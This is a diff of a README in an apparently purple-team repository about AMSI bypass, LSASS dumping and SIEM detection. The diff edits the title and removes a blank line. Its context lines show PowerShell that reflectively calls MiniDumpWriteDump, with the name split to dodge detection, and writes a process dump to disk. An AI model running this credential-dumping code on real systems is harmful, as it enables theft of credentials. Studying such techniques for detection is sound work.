@@ -1,5 +1,5 @@
 # PurpleTeam
-Execution Attacks and detection
+Execution Bypass AMSI and Lsass Dump Attacks and detection by SIEM
 
 Bypass AMSI
 -
@@ -32,7 +32,6 @@ $C = [Reflection.BindingFlags] 'NonPublic, Static'
 $D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
 $PF = "$($P.Name)_$($P.Id).dmp"
 $PDP = Join-Path $S $PF
-
 $F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
 $R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
 $F.Close()
